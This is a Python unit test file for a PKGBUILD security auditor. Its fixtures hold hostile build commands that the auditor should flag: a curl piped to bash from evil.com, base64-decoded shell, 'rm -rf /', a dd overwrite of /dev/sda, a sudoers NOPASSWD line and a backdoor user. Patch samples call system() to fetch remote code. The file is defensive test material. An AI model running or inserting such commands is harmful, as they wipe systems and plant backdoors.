"""
PKGBUILD 安全审计脚本测试
"""

import importlib.util
import unittest
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / '.github' / 'pkgbuild-audit-action' / 'audit_pkgbuild.py'


def load_module(module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, MODULE_PATH)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


class ExtractSourcesTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def test_single_line_sources(self):
        content = "source=('https://example.com/file.tar.gz')"
        sources = self.module.extract_sources(content)
        self.assertEqual(sources, ['https://example.com/file.tar.gz'])

    def test_multi_line_sources(self):
        content = """source=('https://example.com/file1.tar.gz'
                'https://example.com/file2.tar.gz')"""
        sources = self.module.extract_sources(content)
        self.assertEqual(sources, [
            'https://example.com/file1.tar.gz',
            'https://example.com/file2.tar.gz',
        ])

    def test_source_with_filename(self):
        content = "source=('${pkgname}-${pkgver}.tar.gz::https://example.com/file.tar.gz')"
        sources = self.module.extract_sources(content)
        self.assertEqual(len(sources), 1)
        self.assertIn('https://example.com/file.tar.gz', sources[0])

    def test_empty_source(self):
        content = "source=()"
        sources = self.module.extract_sources(content)
        self.assertEqual(sources, [])

    def test_arch_specific_sources_merged(self):
        content = """source=('LICENSE::https://example.com/LICENSE')
source_x86_64=('pkg.deb::https://example.com/pkg-x64.deb')
source_aarch64=('pkg.deb::https://example.com/pkg-arm64.deb')"""
        sources = self.module.extract_sources(content)
        self.assertEqual(sources, [
            'LICENSE::https://example.com/LICENSE',
            'pkg.deb::https://example.com/pkg-x64.deb',
            'pkg.deb::https://example.com/pkg-arm64.deb',
        ])

    def test_arch_specific_sources_only(self):
        content = """source_x86_64=('pkg.deb::https://example.com/pkg-x64.deb')
source_aarch64=('pkg.deb::https://example.com/pkg-arm64.deb')"""
        sources = self.module.extract_sources(content)
        self.assertEqual(sources, [
            'pkg.deb::https://example.com/pkg-x64.deb',
            'pkg.deb::https://example.com/pkg-arm64.deb',
        ])

    def test_source_like_names_not_matched(self):
        # 类似 source 的变量名（如 sources）不应被误提取
        content = "sources=('https://example.com/not-a-real-var')"
        sources = self.module.extract_sources(content)
        self.assertEqual(sources, [])


class ExtractChecksumsTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def test_sha256sums(self):
        content = "sha256sums=('abc123def456')"
        cs = self.module.extract_checksums(content)
        self.assertIn('sha256sums', cs)
        self.assertEqual(cs['sha256sums'], ['abc123def456'])

    def test_md5sums(self):
        content = "md5sums=('abc123')"
        cs = self.module.extract_checksums(content)
        self.assertIn('md5sums', cs)

    def test_multiple_checksum_types(self):
        content = """sha256sums=('abc')
sha512sums=('def')
md5sums=('ghi')"""
        cs = self.module.extract_checksums(content)
        self.assertEqual(len(cs), 3)

    def test_no_checksums(self):
        content = "pkgname=test"
        cs = self.module.extract_checksums(content)
        self.assertEqual(cs, {})

    def test_arch_specific_checksums_merged(self):
        content = """sha256sums=('abc123')
sha256sums_x86_64=('def456')
sha256sums_aarch64=('ghi789')"""
        cs = self.module.extract_checksums(content)
        self.assertIn('sha256sums', cs)
        self.assertEqual(cs['sha256sums'], ['abc123', 'def456', 'ghi789'])


class ExtractSourceUrlsTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def test_direct_url(self):
        urls = self.module.extract_source_urls([
            'https://github.com/user/repo/releases/download/v1.0/pkg.deb',
        ])
        self.assertEqual(urls, [
            'https://github.com/user/repo/releases/download/v1.0/pkg.deb',
        ])

    def test_filename_prefix_url(self):
        urls = self.module.extract_source_urls([
            'pkg-1.0.tar.gz::https://github.com/user/repo/releases/download/v1.0/pkg.tar.gz',
        ])
        self.assertEqual(urls, [
            'https://github.com/user/repo/releases/download/v1.0/pkg.tar.gz',
        ])

    def test_local_file_skipped(self):
        urls = self.module.extract_source_urls([
            'local-script.sh',
            'https://github.com/user/repo/releases/download/v1.0/pkg.deb',
        ])
        self.assertEqual(urls, [
            'https://github.com/user/repo/releases/download/v1.0/pkg.deb',
        ])

    def test_mixed_sources(self):
        urls = self.module.extract_source_urls([
            'LICENSE::https://raw.githubusercontent.com/user/repo/main/LICENSE',
            'pkg-1.0.tar.gz::https://github.com/user/repo/releases/download/v1.0/pkg.tar.gz',
            'local.install',
        ])
        self.assertEqual(urls, [
            'https://raw.githubusercontent.com/user/repo/main/LICENSE',
            'https://github.com/user/repo/releases/download/v1.0/pkg.tar.gz',
        ])


class CloneRepositoryTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def test_transient_failures_are_retried(self):
        failed = mock.Mock(returncode=128, stderr='TLS handshake failed')
        succeeded = mock.Mock(returncode=0, stderr='')
        self.module.subprocess.run = mock.Mock(
            side_effect=[failed, failed, succeeded]
        )
        self.module.time.sleep = mock.Mock()

        success, error = self.module.clone_repository(
            'https://aur.archlinux.org/example.git', '/unused/repo'
        )

        self.assertTrue(success)
        self.assertEqual(error, '')
        self.assertEqual(self.module.subprocess.run.call_count, 3)


class GlobToRegexTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def test_exact_match(self):
        regex = self.module._glob_to_regex('https://github.com/user/repo/*')
        self.assertTrue(self.module.re.search(regex, 'https://github.com/user/repo/download/v1.0/pkg.deb'))
        self.assertFalse(self.module.re.search(regex, 'https://github.com/attacker/repo/download/v1.0/pkg.deb'))

    def test_wildcard(self):
        regex = self.module._glob_to_regex('https://*.example.com/*')
        self.assertTrue(self.module.re.search(regex, 'https://cdn.example.com/files/pkg.tar.gz'))
        self.assertFalse(self.module.re.search(regex, 'https://evil.com/files/pkg.tar.gz'))

    def test_question_mark(self):
        regex = self.module._glob_to_regex('https://cdn-?.example.com/*')
        self.assertTrue(self.module.re.search(regex, 'https://cdn-1.example.com/file'))
        self.assertFalse(self.module.re.search(regex, 'https://cdn-12.example.com/file'))

    def test_special_chars_escaped(self):
        regex = self.module._glob_to_regex('https://example.com/path/file.tar.gz')
        self.assertTrue(self.module.re.search(regex, 'https://example.com/path/file.tar.gz'))
        self.assertFalse(self.module.re.search(regex, 'https://example.com/pathXfile.tar.gz'))


class ExtractPatchAdditionsTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def test_extracts_plus_lines_only(self):
        content = """--- a/file.c
+++ b/file.c
@@ -1,3 +1,4 @@
 int main() {
-    return 0;
+    system("echo hacked");
+    return 1;
 }"""
        additions = self.module.extract_patch_additions(content)
        self.assertIn('system("echo hacked")', additions)
        self.assertIn('    return 1;', additions)
        self.assertNotIn('    return 0;', additions)
        self.assertNotIn('--- a/file.c', additions)
        self.assertNotIn('+++ b/file.c', additions)

    def test_empty_patch(self):
        additions = self.module.extract_patch_additions("")
        self.assertEqual(additions, '')


class RunChecksTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module('audit_pkgbuild_under_test')

    def _run(self, content, allowed_patterns=None, patch_contents=None):
        return self.module.run_checks(content, allowed_patterns, patch_contents)

    def assert_has_issue(self, issues, rule_id, severity=None):
        for sev, rid, desc in issues:
            if rid == rule_id:
                if severity is not None:
                    self.assertEqual(sev, severity,
                                     f'Expected {severity} for {rule_id}, got {sev}')
                return
        self.fail(f'Issue {rule_id} not found in {[(r, s) for s, r, _ in issues]}')

    def assert_no_issue(self, issues, rule_id):
        for _, rid, _ in issues:
            if rid == rule_id:
                self.fail(f'Unexpected issue {rule_id} found')

    # ── CRITICAL ──────────────────────────────────────────

    def test_curl_pipe_bash(self):
        content = 'source=("https://evil.com/script.sh")\nbuild() { curl https://evil.com/script.sh | bash }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'curl-pipe-shell', 'CRITICAL')

    def test_eval(self):
        content = 'build() { eval "$SOME_VAR" }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'eval-exec', 'CRITICAL')

    def test_base64_decode(self):
        content = 'build() { echo "dG91Y2ggL3RtcC9iYWNrZG9vcg==" | base64 -d | sh }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'base64-decode', 'CRITICAL')

    def test_destructive_rm(self):
        content = 'build() { rm -rf / }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'destructive-rm', 'CRITICAL')

    def test_chmod_777(self):
        content = 'package() { chmod -R 777 "$pkgdir" }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'chmod-world-writable', 'CRITICAL')

    # ── ERROR ─────────────────────────────────────────────

    def test_source_raw_ip(self):
        content = "source=('http://192.168.1.1/backdoor.tar.gz')"
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-raw-ip', 'ERROR')

    def test_source_file_protocol(self):
        content = "source=('file:///etc/passwd')"
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-file-protocol', 'ERROR')

    def test_source_git_insecure(self):
        content = "source=('git://evil.com/repo.git')"
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-git-insecure', 'ERROR')

    def test_sudoers_modification(self):
        content = 'package() { echo "ALL ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'sudoers-modification', 'ERROR')

    def test_create_system_user(self):
        content = 'package() { useradd -r backdoor }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'create-system-user', 'ERROR')

    def test_dd_write_device(self):
        content = 'build() { dd if=/dev/zero of=/dev/sda }'
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'dd-write-device', 'ERROR')

    # ── WARNING ───────────────────────────────────────────

    def test_checksum_skip(self):
        content = "sha256sums=('SKIP')"
        issues, blocking = self._run(content)
        self.assertFalse(blocking)
        self.assert_has_issue(issues, 'checksum-skip', 'WARNING')

    def test_md5_checksums(self):
        content = "md5sums=('abc')"
        issues, blocking = self._run(content)
        self.assertFalse(blocking)
        self.assert_has_issue(issues, 'checksum-md5', 'WARNING')

    def test_source_http(self):
        content = "source=('http://example.com/file.tar.gz')"
        issues, blocking = self._run(content)
        self.assertFalse(blocking)
        self.assert_has_issue(issues, 'source-non-https', 'WARNING')

    def test_suspicious_tld(self):
        content = "source=('https://evil.xyz/malware.tar.gz')"
        issues, blocking = self._run(content)
        self.assertFalse(blocking)
        self.assert_has_issue(issues, 'source-suspicious-tld', 'WARNING')

    def test_missing_checksums(self):
        content = "source=('https://example.com/file.tar.gz')"
        issues, blocking = self._run(content)
        self.assertFalse(blocking)
        self.assert_has_issue(issues, 'checksum-missing', 'WARNING')

    # ── 上游 URL 模式白名单 ─────────────────────────────────

    def test_pattern_match(self):
        content = "source=('https://github.com/anomalyco/opencode/releases/download/v1.0/pkg.deb')"
        patterns = ['https://github.com/anomalyco/opencode/releases/download/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assert_no_issue(issues, 'source-patterns-mismatch')

    def test_pattern_match_expands_static_pkgbuild_variables(self):
        content = """pkgname=fcitx5-voice-input
pkgver=0.3.1
source=('https://github.com/devcxl/${pkgname}/archive/refs/tags/v${pkgver}.tar.gz')"""
        patterns = [
            'https://github.com/devcxl/fcitx5-voice-input/archive/refs/tags/v*.tar.gz'
        ]
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertFalse(blocking)
        self.assert_no_issue(issues, 'source-patterns-mismatch')

    def test_pattern_match_expands_custom_static_variables(self):
        # 自定义静态标量（如 _npmname=wrangler）应参与 URL 展开
        content = """_npmname=wrangler
pkgver=4.123.0
source=("$_npmname-$pkgver.tgz::https://registry.npmjs.org/$_npmname/-/$_npmname-$pkgver.tgz")"""
        patterns = ['https://registry.npmjs.org/wrangler/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertFalse(blocking)
        self.assert_no_issue(issues, 'source-patterns-mismatch')

    def test_pattern_match_custom_variable_dynamic_assignment_not_expanded(self):
        # 变量被动态赋值（含 $）时不应展开，URL 保留原样导致白名单不匹配
        content = """_npmname=wrangler
_npmname="$(get_name)"
source=("https://registry.npmjs.org/$_npmname/-/$_npmname-$pkgver.tgz")"""
        patterns = ['https://registry.npmjs.org/wrangler/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-patterns-mismatch', 'ERROR')

    def test_arch_specific_source_urls_checked_against_whitelist(self):
        content = """pkgver=3.7.7
source_x86_64=('pkg.deb::https://cdn-zcode.z.ai/zcode/electron/releases/${pkgver}/linux-x64/pkg.deb')
source_aarch64=('pkg.deb::https://cdn-zcode.z.ai/zcode/electron/releases/${pkgver}/linux-arm64/pkg.deb')"""
        patterns = ['https://cdn-zcode.z.ai/zcode/electron/releases/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertFalse(blocking)
        self.assert_no_issue(issues, 'source-patterns-mismatch')

    def test_arch_specific_source_urls_mismatch_blocks(self):
        content = """pkgver=3.7.7
source_x86_64=('pkg.deb::https://cdn-zcode.z.ai/zcode/electron/releases/${pkgver}/linux-x64/pkg.deb')
source_aarch64=('pkg.deb::https://evil.example.com/zcode/pkg.deb')"""
        patterns = ['https://cdn-zcode.z.ai/zcode/electron/releases/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-patterns-mismatch', 'ERROR')

    def test_pattern_mismatch_typosquatting(self):
        content = "source=('https://github.com/anommalyco/opencode/releases/download/v1.0/pkg.deb')"
        patterns = ['https://github.com/anomalyco/opencode/releases/download/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-patterns-mismatch', 'ERROR')

    def test_pattern_mismatch_different_repo(self):
        content = "source=('https://github.com/attacker/opencode/releases/download/v1.0/pkg.deb')"
        patterns = ['https://github.com/anomalyco/opencode/releases/download/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-patterns-mismatch', 'ERROR')

    def test_pattern_multiple_match(self):
        content = """source=(
            'pkg-1.0.deb::https://github.com/anomalyco/opencode/releases/download/v1.0/pkg.deb'
            'LICENSE::https://raw.githubusercontent.com/anomalyco/opencode/v1.0/LICENSE'
        )"""
        patterns = [
            'https://github.com/anomalyco/opencode/releases/download/*',
            'https://raw.githubusercontent.com/anomalyco/opencode/*',
        ]
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assert_no_issue(issues, 'source-patterns-mismatch')

    def test_pattern_multiple_one_mismatch(self):
        content = """source=(
            'pkg-1.0.deb::https://github.com/anomalyco/opencode/releases/download/v1.0/pkg.deb'
            'LICENSE::https://raw.githubusercontent.com/attacker/opencode/v1.0/LICENSE'
        )"""
        patterns = [
            'https://github.com/anomalyco/opencode/releases/download/*',
            'https://raw.githubusercontent.com/anomalyco/opencode/*',
        ]
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-patterns-mismatch', 'ERROR')

    def test_patterns_unconfigured_warning(self):
        content = "source=('https://github.com/user/repo/releases/download/v1.0/pkg.deb')"
        issues, blocking = self._run(content, allowed_patterns=None)
        self.assertFalse(blocking)
        self.assert_has_issue(issues, 'source-patterns-unconfigured', 'WARNING')

    def test_no_remote_urls_no_pattern_warning(self):
        content = "source=('local-script.sh')"
        issues, blocking = self._run(content, allowed_patterns=None)
        self.assert_no_issue(issues, 'source-patterns-unconfigured')

    # ── 补丁内容审计 ────────────────────────────────────────

    def test_patch_eval(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,2 @@
 int main() {
+    eval("malicious");
 }"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'patch-eval', 'CRITICAL')

    def test_patch_base64_decode(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,2 @@
+    system(base64 -d <<< "dG91Y2ggL2V0Yy9wYXNzd2Q=");
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'patch-base64', 'CRITICAL')

    def test_patch_hardcoded_ip(self):
        patch = """--- a/config.h
+++ b/config.h
@@ -1,1 +1,1 @@
-#define SERVER "localhost"
+#define SERVER "10.0.0.99"
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'config.patch': patch},
        )
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'patch-hardcoded-ip', 'ERROR')

    def test_patch_system_call(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,1 @@
+    system("curl http://evil.com/b | sh");
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assert_has_issue(issues, 'patch-system-call', 'WARNING')

    def test_patch_network_connect(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,2 @@
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    connect(sock, &addr, sizeof(addr));
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'net.patch': patch},
        )
        self.assert_has_issue(issues, 'patch-network', 'WARNING')

    def test_patch_evil_keyword(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,1 @@
+    // backdoor for remote access
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assert_has_issue(issues, 'patch-evil-keyword', 'WARNING')

    def test_patch_clean_does_not_trigger(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,2 +1,2 @@
 int main() {
-    printf("hello");
+    printf("hello world");
     return 0;
 }"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assertFalse(blocking)
        for sev, rid, _ in issues:
            self.assertFalse(rid.startswith('patch-'),
                             f'Unexpected patch issue: {rid}')

    def test_patch_etc_ssl_excluded(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,1 @@
+    const char *cert = "/etc/ssl/certs/ca.pem";
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assert_no_issue(issues, 'patch-etc-write')

    def test_patch_etc_other_triggered(self):
        patch = """--- a/file.c
+++ b/file.c
@@ -1,1 +1,1 @@
+    FILE *f = fopen("/etc/passwd", "a");
"""
        issues, blocking = self._run(
            'pkgname=test\nsource=()',
            patch_contents={'fix.patch': patch},
        )
        self.assert_has_issue(issues, 'patch-etc-write', 'WARNING')

    # ── CLEAN ─────────────────────────────────────────────

    def test_clean_pkgbuild(self):
        content = """pkgname=visual-studio-code-bin
pkgver=1.100.0
pkgrel=1
source=('https://update.code.visualstudio.com/${pkgver}/linux-x64/stable')
sha256sums=('abc123def456789')"""
        patterns = ['https://update.code.visualstudio.com/*']
        issues, blocking = self._run(content, allowed_patterns=patterns)
        self.assertFalse(blocking)
        self.assertEqual(issues, [])

    # ── MIXED ─────────────────────────────────────────────

    def test_warning_only_does_not_block(self):
        content = """source=('http://example.com/file.tar.gz')
sha256sums=('SKIP')"""
        issues, blocking = self._run(content)
        self.assertFalse(blocking)
        issue_ids = [rid for _, rid, _ in issues]
        self.assertIn('source-non-https', issue_ids)
        self.assertIn('checksum-skip', issue_ids)

    def test_error_and_warning_mixed(self):
        content = """source=('http://192.168.1.1/file.tar.gz' 'http://example.com/file2.tar.gz')
sha256sums=('SKIP' 'SKIP')"""
        issues, blocking = self._run(content)
        self.assertTrue(blocking)
        self.assert_has_issue(issues, 'source-raw-ip', 'ERROR')
        self.assert_has_issue(issues, 'source-non-https', 'WARNING')
        self.assert_has_issue(issues, 'checksum-skip', 'WARNING')


if __name__ == '__main__':
    unittest.main()
